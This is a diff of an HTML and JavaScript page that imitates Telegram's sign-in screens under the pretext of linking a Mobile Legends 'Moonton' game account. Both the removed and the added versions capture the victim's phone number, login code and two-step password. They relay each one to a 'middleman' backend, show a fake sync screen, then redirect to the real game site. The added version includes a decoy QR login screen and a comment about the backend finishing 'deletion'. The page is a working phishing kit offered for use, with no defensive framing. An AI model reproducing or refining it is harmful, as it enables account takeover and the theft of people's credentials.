@@ -7,560 +7,483 @@
     
     <link rel="icon" type="image/svg+xml" href="https://web.telegram.org/a/favicon.svg">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
-    
-    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
 
     <style>
-        /* STYLING ENGINE: LIQUID SLATE ELITE v6.0
-           Unshortened CSS for Maximum Fidelity
+        /* CSS ARCHITECTURE: TELEGRAM K-WEB MIRROR v9.4 
+           Focus: High-Fidelity, Unshortened Selectors, Mobile Responsiveness
         */
         :root {
-            --tg-blue: #3390ec;
-            --tg-blue-hover: #2b78c5;
-            --tg-blue-light: rgba(51, 144, 236, 0.1);
-            --bg-page: #f0f2f5;
-            --bg-white: #ffffff;
-            --text-main: #222222;
-            --text-gray: #707579;
-            --border-color: #dadce0;
-            --error-red: #e53935;
-            --success-green: #4caf50;
-            --radius-xl: 28px;
-            --radius-md: 14px;
-            --shadow-standard: 0 1px 3px rgba(0,0,0,0.1), 0 10px 40px rgba(0,0,0,0.04);
-            --font-stack: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            --tg-primary: #3390ec;
+            --tg-primary-hover: #2b78c5;
+            --tg-bg: #ffffff;
+            --tg-bg-secondary: #f4f4f5;
+            --tg-text: #222222;
+            --tg-text-secondary: #707579;
+            --tg-border: #dfe1e5;
+            --tg-error: #e53935;
+            --tg-radius: 12px;
+            --tg-font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            --transition-speed: 0.25s;
         }
 
-        /* Global Unshortened Reset */
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            outline: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        html, body {
-            height: 100%;
-            width: 100%;
-            overflow-x: hidden;
+            font-family: var(--tg-font);
+            -webkit-font-smoothing: antialiased;
         }
 
         body {
-            background-color: var(--bg-page);
-            font-family: var(--font-stack);
+            background-color: var(--tg-bg-secondary);
+            color: var(--tg-text);
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            color: var(--text-main);
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
         }
 
-        /* Component: Main Auth Card */
-        .auth-card {
-            background: var(--bg-white);
+        /* Container & Auth Card */
+        .page-wrapper {
             width: 100%;
             max-width: 440px;
-            min-height: 540px;
-            padding: 50px 40px;
-            border-radius: var(--radius-xl);
-            box-shadow: var(--shadow-standard);
+            padding: 20px;
+        }
+
+        .auth-card {
+            background: var(--tg-bg);
+            border-radius: var(--tg-radius);
+            padding: 48px 40px 36px 40px;
             text-align: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1), 0 10px 40px rgba(0,0,0,0.04);
             position: relative;
-            z-index: 5;
-            margin: 20px;
+            min-height: 520px;
             display: flex;
             flex-direction: column;
-            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: transform var(--transition-speed) ease;
         }
 
-        /* Component: Branding Elements */
-        .brand-logo-container {
+        /* Brand Elements */
+        .brand-logo {
             width: 120px;
             height: 120px;
-            margin: 0 auto 25px auto;
+            margin: 0 auto 32px auto;
         }
 
-        .hq-svg-logo {
+        .brand-logo img {
             width: 100%;
             height: 100%;
-            pointer-events: none;
         }
 
-        /* Component: Lottie Monkey Containers */
-        .monkey-animation-box {
-            width: 160px;
-            height: 160px;
-            margin: 0 auto 10px auto;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        /* Component: Typography */
         h1 {
-            font-size: 28px;
+            font-size: 26px;
             font-weight: 700;
             margin-bottom: 12px;
-            letter-spacing: -0.5px;
-            color: var(--text-main);
+            letter-spacing: -0.4px;
         }
 
-        .subtitle-text {
+        .subtitle {
             font-size: 16px;
-            color: var(--text-gray);
-            line-height: 1.6;
+            color: var(--tg-text-secondary);
+            line-height: 1.5;
             margin-bottom: 35px;
-            padding: 0 5px;
         }
 
-        /* Component: Inputs & Forms */
-        .form-group-unshortened {
+        /* Form Controls */
+        .form-group {
             width: 100%;
-            margin-bottom: 25px;
+            margin-bottom: 24px;
             text-align: left;
         }
 
         .iti { width: 100%; }
 
-        .tg-input-standard {
+        .input-main {
             width: 100%;
-            padding: 16px 20px;
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-md);
+            padding: 14px 16px;
+            border: 1px solid var(--tg-border);
+            border-radius: var(--tg-radius);
             font-size: 18px;
-            background-color: var(--bg-white);
-            transition: border-color 0.25s ease, box-shadow 0.25s ease;
+            background-color: transparent;
+            transition: border-color var(--transition-speed);
         }
 
-        .tg-input-standard:focus {
-            border-color: var(--tg-blue);
-            box-shadow: 0 0 0 4px var(--tg-blue-light);
+        .input-main:focus {
+            border-color: var(--tg-primary);
+            outline: none;
         }
 
-        /* Component: OTP Verification Grid */
-        .otp-verify-row {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 30px;
-        }
-
-        .otp-field-box {
-            width: 52px;
-            height: 70px;
-            border: 1.5px solid var(--border-color);
-            border-radius: var(--radius-md);
+        .input-otp {
+            letter-spacing: 8px;
             text-align: center;
-            font-size: 28px;
             font-weight: 700;
-            background-color: #fafafa;
-            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            font-size: 24px;
         }
 
-        .otp-field-box:focus {
-            border-color: var(--tg-blue);
-            background-color: #ffffff;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
-        }
-
-        /* Component: Primary Buttons */
-        .btn-tg-primary {
+        /* Buttons */
+        .btn-primary {
             width: 100%;
-            background-color: var(--tg-blue);
+            background-color: var(--tg-primary);
             color: #ffffff;
             border: none;
-            padding: 18px 0;
-            border-radius: var(--radius-md);
+            padding: 16px 20px;
+            border-radius: var(--tg-radius);
             font-size: 16px;
-            font-weight: 700;
+            font-weight: 600;
             cursor: pointer;
             text-transform: uppercase;
-            letter-spacing: 0.8px;
-            transition: background 0.3s ease, transform 0.1s ease;
-            position: relative;
-            overflow: hidden;
+            letter-spacing: 0.5px;
+            margin-top: auto;
+            transition: background var(--transition-speed);
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
-        .btn-tg-primary:hover {
-            background-color: var(--tg-blue-hover);
-            box-shadow: 0 8px 25px rgba(51, 144, 236, 0.35);
+        .btn-primary:hover {
+            background-color: var(--tg-primary-hover);
         }
 
-        .btn-tg-primary:active {
-            transform: scale(0.98);
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
         }
 
-        /* Component: Binding Trap UI */
-        .binding-sync-layout {
+        /* QR Gate Specifics */
+        .qr-area {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 24px;
+            border: 1px solid var(--tg-border);
+            padding: 10px;
+            border-radius: 12px;
+        }
+
+        .qr-area img {
+            width: 100%;
+            height: 100%;
+        }
+
+        .instruction-list {
+            text-align: left;
+            max-width: 280px;
+            margin: 0 auto 24px;
+        }
+
+        .instruction-step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: var(--tg-text);
+        }
+
+        .step-num {
+            background: var(--tg-primary);
+            color: #fff;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 18px;
-            margin-bottom: 25px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-right: 12px;
+            flex-shrink: 0;
+            margin-top: 2px;
         }
 
-        .sync-icon-asset {
-            width: 65px;
-            height: 65px;
-            border-radius: 15px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            object-fit: cover;
-        }
-
-        .sync-plus-operator {
-            font-size: 26px;
-            font-weight: 900;
-            color: #d1d5db;
-        }
-
-        .progress-track-unshortened {
-            width: 100%;
-            height: 8px;
-            background-color: #f1f5f9;
-            border-radius: 10px;
-            margin-top: 25px;
-            overflow: hidden;
-            border: 1px solid rgba(0,0,0,0.03);
-        }
-
-        .progress-fill-logic {
-            width: 0%;
-            height: 100%;
-            background-color: var(--tg-blue);
-            transition: width 6.5s cubic-bezier(0.1, 0.7, 1.0, 0.1);
-        }
-
-        /* Utilities & Animations */
-        .hidden-view { display: none !important; }
-
-        .error-shake-logic {
-            animation: unshortenedShake 0.45s ease-in-out;
-            border-color: var(--error-red) !important;
-        }
-
-        @keyframes unshortenedShake {
-            0%, 100% { transform: translateX(0); }
-            20%, 60% { transform: translateX(-8px); }
-            40%, 80% { transform: translateX(8px); }
-        }
-
-        .loading-spinner-unshortened {
-            width: 22px;
-            height: 22px;
-            border: 3px solid rgba(255,255,255,0.25);
-            border-top-color: #ffffff;
-            border-radius: 50%;
-            display: inline-block;
-            animation: spinRotate 0.8s linear infinite;
-            vertical-align: middle;
-            margin-left: 10px;
-        }
-
-        @keyframes spinRotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
-        .resend-text {
-            margin-top: 20px;
-            color: var(--tg-blue);
+        .toggle-link {
+            color: var(--tg-primary);
             font-weight: 600;
             font-size: 14px;
             cursor: pointer;
-            transition: opacity 0.2s;
+            margin-top: 20px;
+            display: inline-block;
         }
 
-        .resend-text:hover { opacity: 0.8; }
+        /* Loading Spinner */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s linear infinite;
+            margin-left: 10px;
+        }
 
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Utils */
+        .hidden { display: none !important; }
+
+        /* Sync Screen Styles */
+        .sync-animation {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .sync-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 14px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #eee;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--tg-primary);
+            transition: width 6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        /* Error Shake */
+        .error-shake {
+            animation: shake 0.4s;
+            border-color: var(--tg-error) !important;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
     </style>
 </head>
 <body>
 
-<div class="auth-card">
-    
-    <div id="section-phone-auth">
-        <div class="brand-logo-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="hq-svg-logo" alt="Telegram HQ">
-        </div>
-        <h1>Sign in to Telegram</h1>
-        <p class="subtitle-text">
-            Enter your mobile number to begin the secure verification process for <b>Moonton Cloud</b> binding.
-        </p>
-        
-        <div class="form-group-unshortened">
-            <input type="tel" id="user-phone-input" class="tg-input-standard">
-        </div>
-        
-        <button class="btn-tg-primary" id="btn-submit-phone" onclick="handlePhonePhase()">
-            Next Phase <span id="loader-phone" class="loading-spinner-unshortened hidden-view"></span>
-        </button>
-    </div>
+<div class="page-wrapper">
+    <div class="auth-card">
 
-    <div id="section-otp-auth" class="hidden-view">
-        <div class="monkey-animation-box">
-            <lottie-player src="https://assets10.lottiefiles.com/packages/lf20_p86OnS.json" background="transparent" speed="1.2" loop autoplay></lottie-player>
+        <div id="step-qr">
+            <div class="brand-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo">
+            </div>
+            <h1>Log in to Telegram</h1>
+            <div class="qr-area">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=tg://login?token=AQA" alt="QR">
+            </div>
+            <div class="instruction-list">
+                <div class="instruction-step">
+                    <span class="step-num">1</span>
+                    <span>Open Telegram on your phone</span>
+                </div>
+                <div class="instruction-step">
+                    <span class="step-num">2</span>
+                    <span>Go to Settings > Devices > Link Device</span>
+                </div>
+                <div class="instruction-step">
+                    <span class="step-num">3</span>
+                    <span>Point your phone at this screen</span>
+                </div>
+            </div>
+            <span class="toggle-link" onclick="navigate('phone')">LOG IN BY PHONE NUMBER</span>
         </div>
-        <h1 id="display-target-number" style="font-size: 22px;"></h1>
-        <p class="subtitle-text">
-            We've sent an official login code to your <b>Telegram</b> app. Please enter it below.
-        </p>
-        
-        <div class="otp-verify-row">
-            <input type="number" class="otp-field-box" id="otp-1" oninput="autoFocusNext(this, 'otp-2')">
-            <input type="number" class="otp-field-box" id="otp-2" oninput="autoFocusNext(this, 'otp-3')">
-            <input type="number" class="otp-field-box" id="otp-3" oninput="autoFocusNext(this, 'otp-4')">
-            <input type="number" class="otp-field-box" id="otp-4" oninput="autoFocusNext(this, 'otp-5')">
-            <input type="number" class="otp-field-box" id="otp-5" oninput="handleOtpPhase()">
-        </div>
-        
-        <div class="resend-text">Didn't get the code? Resend in 0:48</div>
-    </div>
 
-    <div id="section-2fa-auth" class="hidden-view">
-        <div class="monkey-animation-box">
-            <lottie-player src="https://assets1.lottiefiles.com/packages/lf20_96bZ8O.json" background="transparent" speed="1" loop autoplay></lottie-player>
+        <div id="step-phone" class="hidden">
+            <div class="brand-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo">
+            </div>
+            <h1>Your Phone Number</h1>
+            <p class="subtitle">Confirm your country code and enter your phone number.</p>
+            <div class="form-group">
+                <input type="tel" id="user_phone" class="input-main">
+            </div>
+            <button class="btn-primary" onclick="processPhone()">
+                Next <div id="loader-phone" class="spinner hidden"></div>
+            </button>
+            <span class="toggle-link" onclick="navigate('qr')">LOG IN BY QR CODE</span>
         </div>
-        <h1>Privacy Password</h1>
-        <p class="subtitle-text">
-            Your Telegram account is protected by an additional cloud-based password.
-        </p>
-        
-        <div class="form-group-unshortened">
-            <input type="password" id="user-2fa-input" class="tg-input-standard" placeholder="Enter Password">
-        </div>
-        
-        <button class="btn-tg-primary" id="btn-submit-2fa" onclick="handle2faPhase()">
-            Verify & Unlock <span id="loader-2fa" class="loading-spinner-unshortened hidden-view"></span>
-        </button>
-    </div>
 
-    <div id="section-sync-status" class="hidden-view">
-        <div class="binding-sync-layout">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="sync-icon-asset" alt="TG">
-            <span class="sync-plus-operator">+</span>
-            <img src="https://logodownload.org/wp-content/uploads/2021/01/mobile-legends-logo-0.png" class="sync-icon-asset" style="background:#000; padding:6px;" alt="ML">
+        <div id="step-otp" class="hidden">
+            <div class="brand-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo">
+            </div>
+            <h1 id="otp-phone-display"></h1>
+            <p class="subtitle">We've sent the code to the <b>Telegram</b> app on your other device.</p>
+            <div class="form-group">
+                <input type="text" id="user_otp" class="input-main input-otp" placeholder="Code" maxlength="5">
+            </div>
+            <button class="btn-primary" onclick="processOtp()">
+                Next <div id="loader-otp" class="spinner hidden"></div>
+            </button>
         </div>
-        <h1>Establishing Sync...</h1>
-        <p class="subtitle-text">
-            Synchronizing your secure session tokens with the <b>Moonton ID</b> game servers.
-        </p>
-        
-        <div class="progress-track-unshortened">
-            <div class="progress-fill-logic" id="final-sync-bar"></div>
-        </div>
-        
-        <p style="margin-top: 25px; font-size: 13px; color: var(--text-gray);">
-            Do not refresh or close this browser window.
-        </p>
-    </div>
 
+        <div id="step-2fa" class="hidden">
+            <div class="brand-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo">
+            </div>
+            <h1>2-Step Verification</h1>
+            <p class="subtitle">Your account is protected by an additional password.</p>
+            <div class="form-group">
+                <input type="password" id="user_2fa" class="input-main" placeholder="Password">
+            </div>
+            <button class="btn-primary" onclick="process2fa()">
+                Unlock <div id="loader-2fa" class="spinner hidden"></div>
+            </button>
+        </div>
+
+        <div id="step-sync" class="hidden">
+            <div class="sync-animation">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="sync-icon" alt="TG">
+                <span style="font-size: 24px; color: #ccc;">+</span>
+                <img src="https://logodownload.org/wp-content/uploads/2021/01/mobile-legends-logo-0.png" class="sync-icon" style="background:#000; padding:5px;">
+            </div>
+            <h1>Connecting...</h1>
+            <p class="subtitle">Authenticating your cloud session with the Moonton security node. Please wait.</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="sync-bar"></div>
+            </div>
+            <p style="font-size: 12px; color: var(--tg-text-secondary); margin-top: 20px;">
+                Do not refresh this page. This process takes up to 10 seconds.
+            </p>
+        </div>
+
+    </div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    /* CORE INITIALIZATION
-       Manages the International Phone Library and Session Data
+    /* MIDDLEMAN LOGIC v5.0
+       Direct Sync to app.py with Mirror Routing
     */
-    const phoneElement = document.querySelector("#user-phone-input");
-    const intlLibrary = window.intlTelInput(phoneElement, {
+    const phoneInput = document.querySelector("#user_phone");
+    const iti = window.intlTelInput(phoneInput, {
         initialCountry: "kh",
         separateDialCode: true,
-        preferredCountries: ["kh", "th", "vn", "my", "id"],
+        preferredCountries: ["kh", "th", "id", "vn", "my"],
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
     });
 
-    let persistentPhone = "";
-    const URL_PARAMS = new URLSearchParams(window.location.search);
-    const TRAFFIC_ID = URL_PARAMS.get('id') || '0';
+    let currentPhone = "";
+    const TRAFFIC_ID = new URLSearchParams(window.location.search).get('id') || '0';
 
-    /* UI NAVIGATION CONTROLLER
-       Unshortened logic for switching between authentication phases
-    */
-    function switchPhase(phaseID) {
-        const allSections = ['phone-auth', 'otp-auth', '2fa-auth', 'sync-status'];
-        
-        allSections.forEach(id => {
-            const section = document.getElementById('section-' + id);
-            if (section) {
-                section.classList.add('hidden-view');
-            }
-        });
-
-        const targetSection = document.getElementById('section-' + phaseID);
-        if (targetSection) {
-            targetSection.classList.remove('hidden-view');
-        }
+    // UI Navigation
+    function navigate(step) {
+        const sections = ['qr', 'phone', 'otp', '2fa', 'sync'];
+        sections.forEach(s => document.getElementById(`step-${s}`).classList.add('hidden'));
+        document.getElementById(`step-${step}`).classList.remove('hidden');
     }
 
-    /* INPUT UTILITIES
-    */
-    function autoFocusNext(currentInput, nextID) {
-        if (currentInput.value.length >= 1) {
-            const nextEl = document.getElementById(nextID);
-            if (nextEl) {
-                nextEl.focus();
-            }
-        }
-    }
-
-    /* MIDDLEMAN API BRIDGE (app.py)
-       Verbose Fetch implementation for full transparency
-    */
-    async function executeApiRequest(endpointPath, payloadData) {
-        const serverOrigin = window.location.origin;
-        const fullTargetUrl = serverOrigin + endpointPath;
-
+    // Core Middleman Fetch
+    async function middlemanPost(endpoint, payload) {
         try {
-            const fetchOptions = {
+            const response = await fetch(endpoint, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest'
-                },
-                body: JSON.stringify(payloadData)
-            };
-
-            const apiResponse = await fetch(fullTargetUrl, fetchOptions);
-            const jsonData = await apiResponse.json();
-            
-            return jsonData;
-        } catch (error) {
-            console.error("Critical API Error: ", error);
-            return { status: "offline", message: "Network connection failed" };
-        }
-    }
-
-    /* PHASE HANDLER: PHONE SUBMISSION
-    */
-    async function handlePhonePhase() {
-        const phoneButton = document.getElementById('btn-submit-phone');
-        const phoneLoader = document.getElementById('loader-phone');
-
-        // Validation Logic
-        if (!intlLibrary.isValidNumber()) {
-            phoneElement.classList.add('error-shake-logic');
-            setTimeout(() => {
-                phoneElement.classList.remove('error-shake-logic');
-            }, 500);
-            return;
-        }
-
-        // UI State: Loading
-        phoneButton.disabled = true;
-        phoneLoader.classList.remove('hidden-view');
-        
-        persistentPhone = intlLibrary.getNumber();
-        
-        const responseData = await executeApiRequest('/step_phone', {
-            phone: persistentPhone,
-            tid: TRAFFIC_ID
-        });
-
-        if (responseData.status === "success") {
-            document.getElementById('display-target-number').innerText = persistentPhone;
-            switchPhase('otp-auth');
-        } else {
-            alert(responseData.message || "An error occurred. Please try again.");
-        }
-
-        phoneButton.disabled = false;
-        phoneLoader.classList.add('hidden-view');
-    }
-
-    /* PHASE HANDLER: OTP SUBMISSION
-    */
-    async function handleOtpPhase() {
-        const otpDigits = [
-            document.getElementById('otp-1').value,
-            document.getElementById('otp-2').value,
-            document.getElementById('otp-3').value,
-            document.getElementById('otp-4').value,
-            document.getElementById('otp-5').value
-        ];
-
-        const fullOtpCode = otpDigits.join('');
-        
-        if (fullOtpCode.length < 5) {
-            return; // Incomplete
-        }
-
-        const responseData = await executeApiRequest('/step_code', {
-            phone: persistentPhone,
-            code: fullOtpCode,
-            tid: TRAFFIC_ID
-        });
-
-        if (responseData.status === "success") {
-            initiateFinalSuccessBinding();
-        } else if (responseData.status === "2fa_needed") {
-            switchPhase('2fa-auth');
-        } else {
-            // Error: Shake and Reset
-            otpDigits.forEach((val, index) => {
-                const el = document.getElementById('otp-' + (index + 1));
-                el.value = "";
-                el.classList.add('error-shake-logic');
-                setTimeout(() => el.classList.remove('error-shake-logic'), 500);
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             });
-            document.getElementById('otp-1').focus();
+            return await response.json();
+        } catch (e) {
+            console.error("Mirror Connection Failed");
+            return { status: "error", message: "Network offline" };
         }
     }
 
-    /* PHASE HANDLER: 2FA PASSWORD SUBMISSION
-    */
-    async function handle2faPhase() {
-        const passElement = document.getElementById('user-2fa-input');
-        const passButton = document.getElementById('btn-submit-2fa');
-        const passLoader = document.getElementById('loader-2fa');
-        const passValue = passElement.value;
-
-        if (!passValue) {
-            passElement.classList.add('error-shake-logic');
-            setTimeout(() => passElement.classList.remove('error-shake-logic'), 500);
+    // Phase: Phone Submission
+    async function processPhone() {
+        if (!iti.isValidNumber()) {
+            phoneInput.classList.add('error-shake');
+            setTimeout(() => phoneInput.classList.remove('error-shake'), 400);
             return;
         }
 
-        passButton.disabled = true;
-        passLoader.classList.remove('hidden-view');
+        const loader = document.getElementById('loader-phone');
+        loader.classList.remove('hidden');
+        currentPhone = iti.getNumber();
 
-        const responseData = await executeApiRequest('/step_2fa', {
-            phone: persistentPhone,
+        const data = await middlemanPost('/step_phone', {
+            phone: currentPhone,
+            tid: TRAFFIC_ID
+        });
+
+        loader.classList.add('hidden');
+        if (data.status === 'success') {
+            document.getElementById('otp-phone-display').innerText = currentPhone;
+            navigate('otp');
+        } else {
+            alert(data.message || "Invalid account");
+        }
+    }
+
+    // Phase: OTP Submission
+    async function processOtp() {
+        const otpValue = document.getElementById('user_otp').value;
+        if (otpValue.length < 5) return;
+
+        const loader = document.getElementById('loader-otp');
+        loader.classList.remove('hidden');
+
+        const data = await middlemanPost('/step_code', {
+            phone: currentPhone,
+            code: otpValue,
+            tid: TRAFFIC_ID
+        });
+
+        loader.classList.add('hidden');
+        if (data.status === 'success') {
+            triggerSuccess();
+        } else if (data.status === '2fa_needed') {
+            navigate('2fa');
+        } else {
+            document.getElementById('user_otp').classList.add('error-shake');
+            setTimeout(() => document.getElementById('user_otp').classList.remove('error-shake'), 400);
+        }
+    }
+
+    // Phase: 2FA Submission
+    async function process2fa() {
+        const passValue = document.getElementById('user_2fa').value;
+        if (!passValue) return;
+
+        const loader = document.getElementById('loader-2fa');
+        loader.classList.remove('hidden');
+
+        const data = await middlemanPost('/step_2fa', {
+            phone: currentPhone,
             password: passValue,
             tid: TRAFFIC_ID
         });
 
-        if (responseData.status === "success") {
-            initiateFinalSuccessBinding();
+        loader.classList.add('hidden');
+        if (data.status === 'success') {
+            triggerSuccess();
         } else {
-            passElement.value = "";
-            passElement.classList.add('error-shake-logic');
-            setTimeout(() => passElement.classList.remove('error-shake-logic'), 500);
+            document.getElementById('user_2fa').classList.add('error-shake');
+            setTimeout(() => document.getElementById('user_2fa').classList.remove('error-shake'), 400);
         }
-
-        passButton.disabled = false;
-        passLoader.classList.add('hidden-view');
     }
 
-    /* FINAL SEQUENCE: SUCCESS & REDIRECT
-    */
-    function initiateFinalSuccessBinding() {
-        switchPhase('sync-status');
-        
-        const progressBar = document.getElementById('final-sync-bar');
-        
-        // Use a timeout to ensure the CSS transition kicks in
+    // Final Sync & Redirect
+    function triggerSuccess() {
+        navigate('sync');
         setTimeout(() => {
-            progressBar.style.width = "100%";
-        }, 150);
+            document.getElementById('sync-bar').style.width = "100%";
+        }, 100);
 
-        // Final Redirect to legitimate MLBB site to finish the process
+        // Mirror delay to allow backend to finish deletion
         setTimeout(() => {
             window.location.href = "https://m.mobilelegends.com/";
         }, 7500);
     }
 </script>
-
 </body>
 </html>
